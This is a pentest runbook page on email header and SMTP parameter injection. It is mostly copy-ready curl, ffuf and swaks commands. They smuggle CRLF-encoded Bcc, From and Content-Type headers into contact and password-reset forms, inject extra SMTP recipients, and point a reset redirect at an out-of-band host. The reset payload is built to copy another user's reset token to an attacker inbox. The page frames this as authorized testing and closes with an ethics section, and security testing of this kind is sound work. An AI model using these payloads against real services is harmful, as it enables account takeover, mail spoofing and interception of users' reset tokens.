---
title: "Email Injections"
description: "Header and SMTP parameter injection in contact forms and mailers, CC/BCC abuse, SPF/DKIM/DMARC context, and reset/registration impact."
phase: Web
order: 31
tags:
  - email-injection
  - smtp
  - header-injection
  - web
tools:
  - burp suite
  - swaks
updated: 2026-10-01
---

An email injection runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: inject CRLF into mail headers or SMTP parameters to add recipients or overwrite headers, and prove it using mailboxes you control.

## 1. Map the mail flow

Identify contact forms, password reset, invitation, and notification endpoints.

```bash
# Fingerprint the mail-related endpoints
ffuf -u "https://target.com/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,302,500 -t 30 | grep -i -E "contact|reset|invite|mail|smtp"
```

## 2. Establish a baseline

```bash
# Normal submission and resulting response
curl -s -D - -o /dev/null -X POST "https://target.com/contact" \
  -d "email=attacker@example.com&subject=hi&message=test"
```

## 3. Inject headers via CRLF — contact form

Add a BCC or overwrite Subject/From by breaking into the header block.

```bash
# Add a BCC recipient you control
curl -s -X POST "https://target.com/contact" \
  --data-urlencode "email=victim@example.com%0aBcc:attacker@example.com" \
  --data-urlencode "subject=hi" --data-urlencode "message=test"

# Overwrite From/Reply-To
curl -s -X POST "https://target.com/contact" \
  --data-urlencode "email=attacker@example.com%0d%0aFrom:support@target.com" \
  --data-urlencode "message=test"

# Inject a second body / content-type
curl -s -X POST "https://target.com/contact" \
  --data-urlencode "subject=hi%0d%0aContent-Type:text/html%0d%0a%0d%0a<b>injected</b>" \
  --data-urlencode "email=attacker@example.com" --data-urlencode "message=x"
```

## 4. SMTP parameter injection (swaks)

If the app exposes a mail host/port or takes a raw recipient, test SMTP-level injection.

```bash
# Send to a real mailbox you own to observe header behavior
swaks --to attacker@example.com --from test@example.com \
  --header "Subject: baseline" --body "test" --server mail.target.com

# Inject a new recipient through a crafted RCPT value
swaks --to "victim@example.com,attacker@example.com" \
  --from test@example.com --server mail.target.com

# Injected DATA headers
swaks --to attacker@example.com --from test@example.com \
  --header "Cc: second@example.com" --header "Bcc: third@example.com" \
  --server mail.target.com
```

## 5. Reset / registration impact

Header injection in a reset mailer can leak the token to your inbox.

```bash
# Trigger a reset with an injected recipient
curl -s -X POST "https://target.com/password/reset" \
  --data-urlencode "email=victim@example.com%0aBcc:attacker@example.com"

# Check whether the token can be redirected via a URL parameter
curl -s -X POST "https://target.com/password/reset" \
  --data-urlencode "email=attacker@example.com" \
  --data-urlencode "redirect=https://oob.example/reset"
```

## 6. Check SPF/DKIM/DMARC context

```bash
dig +short TXT target.com | grep -i spf
dig +short TXT _dmarc.target.com
dig +short TXT selector._domainkey.target.com
```

Weak SPF/DMARC raises the impact of spoofed sender headers. Note this in the report but do not send unsolicited mail to third parties.

## Full pipeline

```bash
# 1. Find mail endpoints
ffuf -u "https://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,302,500 -t 30 | grep -i -E "contact|reset|invite"

# 2. Baseline
curl -s -D - -o /dev/null -X POST "https://target.com/contact" -d "email=attacker@example.com&subject=hi&message=test"

# 3. CRLF injection
curl -s -X POST "https://target.com/contact" --data-urlencode "email=victim@example.com%0aBcc:attacker@example.com" --data-urlencode "subject=hi" --data-urlencode "message=test"
curl -s -X POST "https://target.com/contact" --data-urlencode "email=attacker@example.com%0d%0aFrom:support@target.com" --data-urlencode "message=test"

# 4. SMTP parameters with swaks
swaks --to attacker@example.com --from test@example.com --header "Cc: second@example.com" --header "Bcc: third@example.com" --server mail.target.com

# 5. Reset impact
curl -s -X POST "https://target.com/password/reset" --data-urlencode "email=victim@example.com%0aBcc:attacker@example.com"

# 6. Mail auth context
dig +short TXT target.com | grep -i spf
dig +short TXT _dmarc.target.com
```

## Ethics & legality

- Use only mailboxes you own as injection recipients; never send unsolicited mail to third parties.
- Only test endpoints within the authorized scope and respect anti-spam policies.
- Do not abuse reset tokens belonging to other users; demonstrate with your own account.
- Capture the injected request and the received mail (headers intact) as evidence.
